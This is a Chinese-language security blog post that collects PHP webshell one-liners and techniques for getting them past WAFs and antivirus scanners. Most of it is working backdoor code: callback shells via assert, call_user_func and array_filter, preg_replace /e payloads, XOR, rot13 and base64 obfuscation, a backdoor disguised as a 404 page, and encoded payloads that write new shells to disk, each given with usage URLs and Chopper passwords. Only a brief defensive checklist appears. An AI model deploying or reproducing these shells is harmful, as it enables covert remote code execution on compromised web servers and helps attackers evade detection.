---
layout:     post
title:      BypassWaf_webshell
date:       2019-1-3
author:     Wh0ale
header-img: img/anatomy_of_php_hack.jpg
catalog: true
tags:
    - bypass
---

# **0x01webshell管理工具的免杀**

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyt9c8n8otj21nv0zcaf9.jpg)

## 1.回调后门

**1.php**

```php 
<?php 
    $POST['POST']='assert';
    $array[]=$POST;
    $array[0]['POST']($_POST['joker']);
?>
```

**用法:**  http://www.xxx.com/1.php

**菜刀连接用法:**  http://www.xxx.com/1.php

**密码：**joker

**详解：**  assert，是php代码执行函数，与eval()有同样的功能，应为$array[],POST[]都是数组，所以$array[]=$POST，就是把$POST数组的值赋给$array数组，这样的话$array[0]['POST']的输出就是assert，所以组成了一句话木马

assert($_POST['joker'])，直接用菜刀链接即可



**2.php**

```php
<?php
error_reporting(0);
$g = array('','s');
$gg = a.$g[1].ser.chr('116');
@$gg($_POST[joker]);
?>
```

**用法:**  http://www.xxx.com/2.php

**菜刀连接用法:** http://www.xxx.com/2.php

**密码：**joker

**详解：$**g是个数组，$g[1]='s'，chr('116')='t',(https://blog.csdn.net/yabingshi_tech/article/details/19833217 ASCll码对应表)，这样的$gg=

assert，@$gg($_POST[joker])不就是assert($_POST[joker])，是我们常见的一句话木马，直接菜刀链接即可



**3.php (array_filter+base64_decode)**

```php
<?php
    error_reporting(0);
    $e=$_REQUEST['e'];
    $arr=array($_POST['joker'],);
    array_filter($arr,base64_decode($e));
?>
```

**用法:** http://www.xxx.com/3.php?e=YXNzZXJ0

**浏览器提交POST：**joker=phpinfo();

**菜刀连接用法:** http://www.xxx.com/3.php?e=YXNzZXJ0

**密码：**joker

**详解：**YXNzZXJ0的base64解码后的结果为assert，$e接受浏览器传过来的参数，$arr是个数组，array_filter()函数用回调函数过滤数组中的值，

![img](https://images2018.cnblogs.com/blog/1344396/201805/1344396-20180506114547971-274761864.png)

如果我们传入$e的参数为YXNzZXJ0，这样的话我们的回调函数名就是assert，并且要过滤数组中的每一个参数

就构成了assert($_POST['joker'])，常见的一句话木马，直接用菜刀链接即可



**4.php**

```php
<?php
error_reporting(0);
call_user_func('assert', $_REQUEST['joker']);
?>
```

 

**用法:** http://www.xxx.com/4.php

**菜刀连接用法:** http://www.xxx.com/4.php

**密码：**joker

**详解：**call_user_func()函数把第一个参数作为回调函数调用，也就是说assert是被调用的回调函数，其余参数是回调函数的参数。

这样的话就直接构成了  assert($_REQUEST['joker']) 这样的一句话木马，直接用菜刀链接即可

## 2.避开关键字

```php
<?php  
($rcoil = $_POST['rcoil']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($rcoil)', 'add');
?>
```

**preg_replace用法：**

http://www.cnblogs.com/crxis/p/7714636.html

mixed preg_replace ( mixed **$pattern** , mixed **$replacement** , mixed **$subject** [, int $limit = -1 [, int &$count ]] )

搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。

参数说明：

- $pattern: 要搜索的模式，可以是字符串或一个字符串数组。
- $replacement: 用于替换的字符串或字符串数组。
- $subject: 要搜索替换的目标字符串或字符串数组。
- $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。
- $count: 可选，为替换执行的次数。

 /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误

```php
<?
echo preg_replace("/test/e",$_GET["h"],"jutst test");
?>
```

如果我们提交?h=phpinfo()，phpinfo()将会被执行（使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行）。 如果我们提交下面的代码会怎么样呢？ ?

```php
h=eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39).chr(100).chr(97). chr(116).chr(97).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39).chr(41).chr(44).chr(39).chr(60). chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91). chr(99).chr(109).chr(100).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59)) 密文对应的明文是：fputs(fopen(data/a.php,w),<?php eval($_POST[cmd])?>); 
```

执行的结果是在/data/目录下生成一个一句话木马文件 a.php。



```php
<?php
function test($str)
{
}
echo preg_replace("/s*[php](.+?)[/php]s*/ies", 'test("\1")', $_GET["h"]);
?>
```

提交 ?h=phpinfo()，phpinfo()会被执行吗？ 肯定不会。因为经过正则匹配后， replacement 参数变为'test("phpinfo")'，此时phpinfo仅是被当做一个字符串参数了。 有没有办法让它执行呢？

当然有。在这里我们如果提交?h={${phpinfo()}}，phpinfo()就会被执行。为什么呢？ 在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。 注意：双引号中的函数不会被执行和替换。

在这里我们需要通过{${}}构造出了一个特殊的变量，'test("{${phpinfo()}}")'，达到让函数被执行的效果（${phpinfo()}会被解释执行）。 可以先做如下测试：

```
echo "{${phpinfo()}}";
```

phpinfo会被成功执行了。

## 3.利用404页面隐藏PHP小马

```php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
<?php
@preg_replace("/[pageerror]/e",$_POST['error'],"saft");
header('HTTP/1.1 404 Not Found');
?>
```

404页面是网站常用的文件，一般建议好后很少有人会去对它进行检查修改，这时我们可以利用这一点进行隐藏后门

## 4.无特征隐藏PHP一句话

```php
<?php
session_start();
$_POST['code'] && $_SESSION['theCode'] = trim($_POST['code']);
$_SESSION['theCode']&&preg_replace('\'a\'eis','e'.'v'.'a'.'l'.'(base64_decode($_SESSION[\'theCode\']))','a');
?>
```

将$_POST['code']的内容赋值给$_SESSION['theCode']，然后执行$_SESSION['theCode']，亮点是没有特征码。用扫描工具来检查代码的话，是不会报警的，达到目的了。

**trim函数**

移除字符串两侧的字符（"Hello" 中的 "He" 以及 "World" 中的 "d!"）：

```php
<?php
$str = "Hello World!";
echo $str . "<br>";
echo trim($str,"Hed!");
?>
```

**超级隐蔽的PHP后门**

```php
<?php $_GET[a]($_GET[b]);?>
```

仅用GET函数就构成了木马；

利用方法：

``` php
?a=assert&b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w% 29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29};
```

执行后当前目录生成c.php一句话木马，当传参a为eval时会报错木马生成失败，为assert时同样报错，但会生成木马，真可谓不可小视，简简单单的一句话，被延伸到这般应用。

## 5.层级请求，编码运行PHP后门

```php
<?php
//1.php
header('Content-type:text/html;charset=utf-8');
parse_str($_SERVER['HTTP_REFERER'], $a);
if(reset($a) == '10' && count($a) == 9) {
eval(base64_decode(str_replace(" ", "+", implode(array_slice($a, 6)))));
}
```



2.php

```php
<?php
//2.php
header('Content-type:text/html;charset=utf-8');
//要执行的代码
$code = <<<CODE
phpinfo();
CODE;
//进行base64编码
$code = base64_encode($code);
//构造referer字符串
$referer = "a=10&b=ab&c=34&d=re&e=32&f=km&g={$code}&h=&i=";
//后门url
$url = 'http://localhost/test1/1.php';
$ch = curl_init();
$options = array(
CURLOPT_URL => $url,
CURLOPT_HEADER => FALSE,
CURLOPT_RETURNTRANSFER => TRUE,
CURLOPT_REFERER => $referer
);
curl_setopt_array($ch, $options);
echo curl_exec($ch);
```

## 6.**三个变形的一句话PHP木马**

**第一个**

```php
<?php ($_=@$_GET[2]).@$_($_POST[1])?>
```

在菜刀里写http://site/1.php?2=assert密码是1

**第二个**

```php
<?php
$_="";
$_[+""]='';
$_="$_"."";
$_=($_[+""]|"").($_[+""]|"").($_[+""]^"");
?>
<?php ${'_'.$_}['_'](${'_'.$_}['__']);?>
```

在菜刀里写http://site/2.php?_=assert&__=eval($_POST['pass']) 密码是pass。
 如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是post提交的。

**第三个**

```php
($b4dboy = $_POST['b4dboy']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add');
```

str_rot13('riny')即编码后的eval，完全避开了关键字，又不失效果，让人吐血！

## 7.过狗免杀PHP一句话一枚

```php
<?php
preg_replace( "/[errorpage]/e", @str_rot13( '@nffreg($_CBFG[cntr]);' ), "saft" );
//@assert($_POST[page]);
//密码page
//http://www.mxcz.net/tools/rot13.aspx		rot13解密
?>
```

## 8..htaccess做PHP后门

**解析漏洞：**

这个其实在2007年的时候作者GaRY就爆出了，只是后边没人关注，这个利用关键点在于一句话：

```php
AddType application/x-httpd-php .htaccess
###### SHELL ###### 这里写上你的后门吧###### LLEHS ######
```

## 9.高级的PHP一句话木马后门

```
1、
$hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
$hh("/[discuz]/e",$_POST['h'],"Access");
//菜刀一句话
2、
$filename=$_GET['xbid'];
include ($filename);
//危险的include函数，直接编译任何文件为php格式运行
3、
$reg="c"."o"."p"."y";
$reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);
//重命名任何文件
4、
$gzid = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
$gzid("/[discuz]/e",$_POST['h'],"Access");
//菜刀一句话
5、include ($uid);
//危险的include函数，直接编译任何文件为php格式运行，POST www.xxx.com/index.php?uid=/home/www/bbs/image.gif
//gif插一句话
6、典型一句话
程序后门代码
<?php eval_r($_POST[sb])?>
程序代码
<?php @eval_r($_POST[sb])?>
//容错代码
程序代码
<?php assert($_POST[sb]);?>
//使用lanker一句话客户端的专家模式执行相关的php语句
程序代码
<?$_POST['sa']($_POST['sb']);?>
程序代码
<?$_POST['sa']($_POST['sb'],$_POST['sc'])?>
程序代码
<?php
@preg_replace("/[email]/e",$_POST['h'],"error");
?>
//使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入
程序代码
<O>h=@eval_r($_POST[c]);</O>
程序代码
<script language="php">@eval_r($_POST[sb])</script>
//绕过<?限制的一句话
```

## 10.如何应对PHP一句话后门

我们强调几个关键点，看这文章的你相信不是门外汉，我也就不啰嗦了：

- 对PHP程序编写要有安全意识
- 服务器日志文件要经常看，经常备份
- 对每个站点进行严格的权限分配
- 对动态文件及目录经常批量安全审查
- 学会如何进行手工杀毒《即行为判断查杀》
- 时刻关注，或渗入活跃的[网络安全](http://www.uedbox.com/)营地
- 对服务器环境层级化处理，哪怕一个函数也可做规则



# 0x02webshell免杀

## 1. 执行函数

首先就是基于各类最常规的命令和代码执行函数的花样变形`如,拆分重组,动态执行,以此来躲避静态特征检测`,不过像有些高危函数默认就会被运维们禁掉,甚至高版本的php默认已经不让执行系统命令[如,php7],万一再开了安全模式,就更费劲了

php中一些常见的执行类型函数:

```
system()
exec()
shell_exec()
passthru()
proc_open()
`` 反引号执行系统命令
...
```



```php
<?php $_POST['fun']($_REQUEST['req']);?>
```

![img](https://klionsec.github.io/img/common%20webshell.png)

```php
<?php  $req = "a"."s"."s"."e"."r"."t";$req($_POST["klion"]); ?>		//字符分割
```

![img](https://klionsec.github.io/img/assert%20simple.png)

```php
<?php $cmd = `$_POST[ch]`;echo "<pre>$cmd</pre>";?>		
```

![img](https://klionsec.github.io/img/fanyinhao.png)

```php
<?php $arr = array("a"=>"$_POST[fun]");$a = "${ $arr["a"]( $_POST[code])}"; ?>
```

![img](https://klionsec.github.io/img/fun%20code.png)

```php
<?php 
$XKs1u='as';$Rqoaou='e';
$ygDOEJ=$XKs1u.'s'.$Rqoaou.'r'.'t';
$joEDdb ='b'.$XKs1u.$Rqoaou.(64).'_'.'d'.$Rqoaou.'c'.'o'.'d'.$Rqoaou;
@$ygDOEJ(@$joEDdb($_POST[nihao]));
?>
```

![img](https://klionsec.github.io/img/chaifenbase64.png)



## 2.编码bypass

利用各类编码来消除静态特征,以此来扰乱waf识别流量,说实话这种还是相对比较容易被检测到

利用base64编码,这种编码可能是各类webshell中用的最频繁的一种,如,weevely中默认就是用的base64,所以免杀性相对较好,另外还有诸如各类免杀大马,过waf菜刀等等……

```php
<?php $a = @base64_decode($a=$_POST['fun']);$a($_POST['code']);?>
```



![img](https://klionsec.github.io/img/base64%20common.png)

利用rot13编码,也用的比较频繁,关于各类编码的内部工作细节,请仔细阅读开发手册

```php
<?php $a=str_rot13('nffreg');$a($_POST['req']);?>
```



![img](https://klionsec.github.io/img/rot13%20common.png)

```php
<?php  
($req = $_POST['req']) &&@preg_replace('/ad/e','@'.str_rot13('nffreg').'($req)', 'add'); 
?>
```

![img](https://klionsec.github.io/img/str_rot13%20spec.png)

利用url编码以及自定义加解密实现的免杀,其实也有点儿类似编码,因为是自己设置的加密,所以只有通信的双方知道,这样一来waf就很难在未解密数据中识别出webshell特征,不过人眼还是很容易就看出来的

```
不实用
```



利用ASCII码转换,消除特征,如chr…比较简单,也比较原始,这里就不多说了,实战也不推荐用,肉眼扫一下就看出来了

```
不实用
```



利用 xor [^ 异或] ~[取反] 注入此类的位运算,实战中依然不推荐,只要是个正常人基本都能看出来这是啥,实际中记得先把下面的url编码解码过来,务必注意两个特殊字符要用双引号包起来,hackbar上面框中的参数可以不用,只要POST里的参数传对了就行

```php
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```



![img](https://klionsec.github.io/img/xor%20webshell.png)

数组特性,这个就更不推荐了,看似花哨,但正常的项目代码中是根本不可能出现这些东西的,很明显,这无疑是在故意告诉别人,你来了,那,这就是我的webshell,请删除,如果单单只是想免杀,回调和反序列也许会更好,相对比价隐蔽,完全不用这么招摇过市的搞

```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;
$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;
$_=$$____;
$___($_[req]); // ASSERT($_POST[_]);
```



![img](https://klionsec.github.io/img/array%20spce%20webshell.png)

## 3.特殊的web服务器自身配置

```php
利用短格式来实现免杀,前提需要目标的php配置已经事先开启短格式支持[php.ini有对应的开关],不过一般默认都是没开的,确实比较鸡肋,不实用
short_open_tag = On 
<?=`$_GET[m]`;
```



![img](https://klionsec.github.io/img/short%20spec.png)



## 4.语言特性灵活隐匿webshell

```
具有回调特性的函数其实还有非常多,这里只是简单地列出了一部分,可挖掘的潜力还比较大,大家可对着手册自行深入研究
利用回调的好处除了免杀之外,还有就是,可以很方便我们`直接把自己的shell插到目标的正常脚本代码中`,让其变得更加难以追踪
关于webshell隐藏的更多内容,这里就不细说了,有兴趣大家可以直接去参考博客`webshell隐藏`相关文章,记得很久之前就总结了一篇
```



```php
<?php 
$a = create_function('', @$_REQUEST['req']);$a();
?>
```

![img](https://klionsec.github.io/img/create_function%20common.png)

```php
<?php 
$ah = $_POST['ah'];
$arr = array($_POST['cmd']);
array_filter($arr,base64_decode($ah));
?>
```

![img](https://klionsec.github.io/img/array_filter%20shell.png)

```php
<?php 
$fun = $_REQUEST['fun'];
$arr = array('xlion'=>1,$_REQUEST['req']=>2);
uksort($arr,$fun);
?>
```

**PHP uksort() 函数**

 uksort(*array,myfunction*);

| 参数         | 描述                                                         |
| ------------ | ------------------------------------------------------------ |
| *array*      | 必需。规定要排序的数组。                                     |
| *myfunction* | 可选。一个定义了可调用比较函数的字符串。如果第一个参数 <, =, > 第二个参数，相应地比较函数必须返回一个 <, =, > 0 的整数。 |

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fythm5md8rj20je0av3yp.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fythmpmpytj21240dg40e.jpg)

![img](https://klionsec.github.io/img/uksort%20spec.png)

```php
<?php 
$arr = new ArrayObject(array('xlion', $_REQUEST['req']));
$arr->uasort(base64_decode($_POST['fun']));
?>
```

![img](https://klionsec.github.io/img/ArrayObject%20sepc.png)

```PHP
<?php 
	$fun = base64_decode($_REQUEST['fun']);
	$arr = array(base64_decode($_POST['code']));
	$arr2 = array(1);
	array_udiff($arr,$arr2,$fun);
?>
```

![img](https://klionsec.github.io/img/array_udiff%20spec.png)

```php
<?php 
mb_ereg_replace('.*', $_REQUEST['req'], '', 'e');
?>
//mb_ereg_replace - 用多字节支持替换正则表达式
```

![img](https://klionsec.github.io/img/mb_ereg_replace%20spec.png)

```php
<?php 
$fun = $_REQUEST['fun'];register_shutdown_function($fun,$_REQUEST['req']);
?>
```

>register_shutdown_function该函数是来注册一个会在PHP中止时执行的函数
>void register_shutdown_function ( callable $callback [, mixed $parameter [, mixed $... ]] ) 
>注册一个 callback ，它会在脚本执行完成或者 exit() 后被调用。

![img](https://klionsec.github.io/img/register_shutdown_function%20spec.png)

```php
<?php echo preg_filter('|.*|e',$_REQUEST['req'],'')?>
```

![img](https://klionsec.github.io/img/preg_filter%20shell.png)

利用序列化与反序列化免杀,简单来讲原理类似反序列化漏洞,因为成员变量可控,在析构的时造成的代码执行:

```php
<?php
class shell{
    public $code="tmpdata";
    function __destruct()
    {
       assert($this->code);
    }
}
$ser = $_GET['serdata'];
unserialize($ser);
```



序列化后的数据

```php
<?php
class shell{
    public $code="phpinfo();";
}
$reload = new shell;
$res = serialize($reload);
echo $res;
```



![img](https://klionsec.github.io/img/serialize.png)

编码配合动态函数:

```php
<?php 
$fun = base64_decode($_POST[fun]);
$code = base64_decode($_POST[code]);
$arr = array("a"=>$fun);
$a = "${ $arr['a']($code)}";
?>
```



![img](https://klionsec.github.io/img/base64%20array.png)

利用包含特性,也是一种相对比较原始的waf bypass方式:

```
<?php include './include_shell.txt'?>php
```



![img](https://klionsec.github.io/img/webshell%20include.png)

利用session机制免杀:

```php
<?php 
session_start();$_SESSION['cmd'] = trim($_POST['code']);
echo preg_replace('\'a\'eis','e'.'v'.'a'.'l'.'(base64_decode($_SESSION[\'cmd\']))','a');
?>
```

>preg_replaced的eis
>
>修饰符： 
>在正则表达式里面的修饰符可以改变正则的很多特性，使得正则表达式更加适合你的需要（注意：修饰符对于大小写是敏感的，这意味着"e"并不等于"E"）。正则表达式里面的修饰符如下： 
>**i ：如果在修饰符中加上"i"，则正则将会取消大小写敏感性，即"a"和"A" 是一样的。** 
>m：默认的正则开始"^"和结束"$"只是对于正则字符串如果在修饰符中加上"m"，那么开始和结束将会指字符串的每一行：每一行的开头就是"^"，结尾就是"$"。 
>s：如果在修饰符中加入"s"，那么默认的"."代表除了换行符以外的任何字符将会变成任意字符，也就是包括换行符！ 
>**x：如果加上该修饰符，表达式中的空白字符将会被忽略，除非它已经被转义。** 
>**e：本修饰符仅仅对于replacement有用，代表在replacement中作为PHP代码。** 
>A：如果使用这个修饰符，那么表达式必须是匹配的字符串中的开头部分。比如说"/a/A"匹配"abcd"。 
>E：与"m"相反，如果使用这个修饰符，那么"$"将匹配绝对字符串的结尾，而不是换行符前面，默认就打开了这个模式。 
>U：和问号的作用差不多，用于设置"贪婪模式"。 
>
>?表单非贪婪匹配，即尽可能少的匹配

![img](https://klionsec.github.io/img/session%20shell.png)

利用php反射特性免杀

```php
<?php 
$func = new ReflectionFunction(base64_decode($_POST[m]));
echo $func->invokeArgs(array(base64_decode($_POST[c])));
php?>
```

![img](https://klionsec.github.io/img/ReflectionFunction%20shell.png)



## 5.后话

```
上面的给出的这些shell,正常来讲,应该都不会活很久,可能有些早已经死了,不得不说的是,像各种编码函数它本身就是敏感特征
因为自己目前还在外地,完整环境也不在身边,就没有一一给大家进行实际的免杀测试了,不过这也并不是目的
这次主要还想跟大家好好梳理一些可以用来免杀的优良特性,大家可以再单独针对这些特性去做深入研究,达到灵活变通才是最终目的
实战中,假设某一个特性不行,不妨同时几个特性配合着一起来,往往会有不错的效果
说实话,如果不针对这些带有特殊特性的函数下手,只是简单的见招拆招,基于此思路衍生出来的shell,现阶段的waf是很难做到主动识别的
当然,等量子或光子计算机及机器学习真正普及的时候,`识别`应该就不是问题了,所以,大家暂可不必担心这些shell被杀,核心还是灵活掌握这些最基本的免杀特性
没事儿的话,还是非常建议大家多去翻翻php的开发手册,里面还有很多没被发觉出来的宝贝,
如果真的是深刻理会了,像什么过waf菜刀自然就很容易理解了,其实现在看来还是蛮简单的
自己拿wireshark跑跑POST包就能看到的很清楚了,然后再针对杀的点逆向一下即可
其实,随着php快速的升级迭代,有些特性可能并不能适用于所有php版本,这也再正常不过
以前的虽然是没有了肯定还会有更好的替代品,还是那句话,思路比任何东西都要重要
可能大家也发现了,这次基本全部都是在说php,并没有涉及到asp,jsp,aspx,java不过其中有些脚本特性都是相通的,大家触类旁通就好了
实际使用中建议不要用的过于花哨,没错,也许你确实是躲避了waf,但却没能逃过运维大叔们的法眼,所以,越不显眼,代码越正常,长度越短越好
当然啦,方法肯定不止这么点儿,也期待能和大家一起多交流
始终坚信,授人以鱼不如授人以渔,^_^ 未完,待续……
```

源：[https://klionsec.github.io/2017/10/11/bypasswaf-for-webshell/](https://klionsec.github.io/2017/10/11/bypasswaf-for-webshell/)

学习：[https://lddp.github.io/2018/07/23/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/#more](https://lddp.github.io/2018/07/23/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/#more)

[回调后门](https://www.codetd.com/article/115647/)

[php一句话木马合集](http://rcoil.me/2016/11/Web%E5%90%8E%E9%97%A8%20%E4%B8%80%E5%8F%A5%E8%AF%9D/)
[php一句话后门](https://mp.weixin.qq.com/s/SCk_Q8oG22SaHX3qJ08HeQ)
[神奇的一句话后门溯源](https://www.jianshu.com/p/197ee47ac1a7)
[php回调后门](https://www.codetd.com/article/115647/)
[webshell合集](https://github.com/tennc/webshell)

[那些强悍的PHP一句话后门](https://www.uedbox.com/good-php-door/)